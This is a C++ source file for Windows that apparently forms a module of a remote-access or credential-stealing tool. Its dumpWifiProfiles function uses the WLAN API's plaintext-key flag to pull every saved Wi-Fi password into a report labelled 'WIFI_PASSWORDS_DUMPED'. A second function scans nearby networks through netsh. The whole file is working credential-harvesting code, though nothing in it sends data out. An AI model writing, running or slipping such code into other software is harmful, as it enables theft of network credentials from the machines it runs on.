#include "WifiDumper.h"
#include "../utils/Exec.h"
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <iomanip>
#include <regex>

#pragma comment(lib, "wlanapi.lib")

namespace wifi {

    namespace {
        std::string getTagValue(const std::string& content, const std::string& tag) {
            // Simple robust regex for extracting tag content: <tag>value</tag>
            std::regex re("<([a-zA-Z0-9_]+:)?" + tag + ">(.*?)</([a-zA-Z0-9_]+:)?" + tag + ">");
            std::smatch match;
            if (std::regex_search(content, match, re)) {
                return match[2].str();
            }
            return "";
        }
    }

    std::string dumpWifiProfiles() {
        HANDLE hClient = NULL;
        DWORD dwMaxClient = 2;
        DWORD dwCurVersion = 0;
        DWORD dwResult = 0;
        std::string report = "WIFI_PASSWORDS_DUMPED (Native API):\n";
        report += "SSID                                     PASSWORD                       AUTH\n";
        report += "----------------------------------------------------------------------------------------------------\n";

        dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
        if (dwResult != ERROR_SUCCESS) {
            return "WIFI_DUMP_ERROR: Failed to open Wlan handle (Code: " + std::to_string(dwResult) + ")";
        }

        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
        if (dwResult != ERROR_SUCCESS) {
            WlanCloseHandle(hClient, NULL);
            return "WIFI_DUMP_ERROR: Failed to enum interfaces.";
        }

        int count = 0;
        for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
            WLAN_INTERFACE_INFO IfInfo = pIfList->InterfaceInfo[i];
            PWLAN_PROFILE_INFO_LIST pProfileList = NULL;

            dwResult = WlanGetProfileList(hClient, &IfInfo.InterfaceGuid, NULL, &pProfileList);
            if (dwResult != ERROR_SUCCESS) continue;

            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
                WLAN_PROFILE_INFO ProfileInfo = pProfileList->ProfileInfo[j];
                LPWSTR pProfileXml = NULL;
                DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                DWORD dwGrantedAccess = 0;

                dwResult = WlanGetProfile(hClient, &IfInfo.InterfaceGuid, ProfileInfo.strProfileName, NULL, &pProfileXml, &dwFlags, &dwGrantedAccess);
                if (dwResult == ERROR_SUCCESS) {
                    // Convert WCHAR* to std::string
                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, pProfileXml, -1, NULL, 0, NULL, NULL);
                    std::string xml(size_needed, 0);
                    WideCharToMultiByte(CP_UTF8, 0, pProfileXml, -1, &xml[0], size_needed, NULL, NULL);

                    std::string ssid = getTagValue(xml, "name");
                    std::string auth = getTagValue(xml, "authentication");
                    std::string key = getTagValue(xml, "keyMaterial");
                    
                    if (key.empty()) key = "[OPEN/NO PASSWORD]";

                    std::stringstream line;
                    line << std::left << std::setw(40) << ssid.substr(0, 39)
                         << std::setw(30) << key.substr(0, 29)
                         << auth << "\n";
                    report += line.str();
                    count++;

                    WlanFreeMemory(pProfileXml);
                }
            }
            if (pProfileList) WlanFreeMemory(pProfileList);
        }

        if (pIfList) WlanFreeMemory(pIfList);
        WlanCloseHandle(hClient, NULL);

        if (count == 0) return "No saved WiFi profiles found.";
        
        report += "\n\nTotal networks: " + std::to_string(count);
        return report;
    }

    std::string scanAvailableWifi() {
        std::string output = utils::RunCommand("netsh wlan show networks mode=Bssid");
        if (output.empty()) return "WIFI_SCAN_ERROR: Failed to run netsh.";

        std::stringstream ss(output);
        std::string line;
        std::string report = "WIFI_SCAN_RESULTS:\n";
        report += "SSID                                     SIGNAL    AUTH            ENCRYPTION\n";
        report += "----------------------------------------------------------------------------------------------------\n";

        struct Network {
            std::string ssid;
            std::string signal;
            std::string auth;
            std::string enc;
        } current;

        std::vector<Network> networks;
        while (std::getline(ss, line)) {
            if (line.find("SSID") != std::string::npos && line.find(":") != std::string::npos) {
                 if (!current.ssid.empty()) {
                     networks.push_back(current);
                     current = Network();
                 }
                 size_t col = line.find(":");
                 current.ssid = line.substr(col + 1);
                 current.ssid.erase(0, current.ssid.find_first_not_of(" \t\r\n"));
                 current.ssid.erase(current.ssid.find_last_not_of(" \t\r\n") + 1);
                 if (current.ssid.empty()) current.ssid = "[Hidden SSID]";
            }
            if (line.find("Signal") != std::string::npos) {
                 size_t col = line.find(":");
                 current.signal = line.substr(col + 1);
                 current.signal.erase(0, current.signal.find_first_not_of(" \t\r\n"));
                 current.signal.erase(current.signal.find_last_not_of(" \t\r\n") + 1);
            }
             if (line.find("Authentication") != std::string::npos) {
                 size_t col = line.find(":");
                 current.auth = line.substr(col + 1);
                 current.auth.erase(0, current.auth.find_first_not_of(" \t\r\n"));
                 current.auth.erase(current.auth.find_last_not_of(" \t\r\n") + 1);
            }
             if (line.find("Encryption") != std::string::npos) {
                 size_t col = line.find(":");
                 current.enc = line.substr(col + 1);
                 current.enc.erase(0, current.enc.find_first_not_of(" \t\r\n"));
                 current.enc.erase(current.enc.find_last_not_of(" \t\r\n") + 1);
            }
        }
        if (!current.ssid.empty()) networks.push_back(current);

        size_t limit = std::min(networks.size(), (size_t)30);
        for (size_t i = 0; i < limit; ++i) {
             std::stringstream row;
             row << std::left << std::setw(40) << networks[i].ssid.substr(0, 39)
                 << std::setw(10) << networks[i].signal
                 << std::setw(15) << networks[i].auth
                 << networks[i].enc << "\n";
             report += row.str();
        }

        report += "\n\nNetworks detected: " + std::to_string(networks.size());
        return report;
    }

}
